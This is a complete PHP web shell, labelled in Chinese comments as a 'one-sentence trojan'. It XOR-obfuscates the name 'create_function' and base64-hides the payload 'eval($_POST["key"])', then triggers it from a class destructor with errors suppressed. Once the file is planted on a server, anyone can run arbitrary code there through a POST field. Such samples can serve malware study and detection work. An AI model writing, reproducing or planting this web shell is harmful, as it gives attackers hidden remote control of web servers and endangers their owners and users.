<?php
// 一句话木马
class LJEF {
    function __destruct() {
        // 定义一个加密字符串
        $TPHV = 'IUBNRVl{h_t|>DS'^"\x2a\x27\x27\x2f\x26\x33\x33\x1d\x1d\x31\x17\x8\x57\x2b\x3d";
        
        // 执行解密后的操作
        @$TPHV = $TPHV('', $this->INTA);
        
        // 调用解密后的函数
        return @$TPHV();
    }
}

// 创建类的实例
$ljef = new LJEF();

// 设置类的 INTA 属性，进行 base64 解码
@$ljef->INTA = base64_decode("IEBldmFsKCRfUE9TVFsia2V5Il0pOw==");
?>
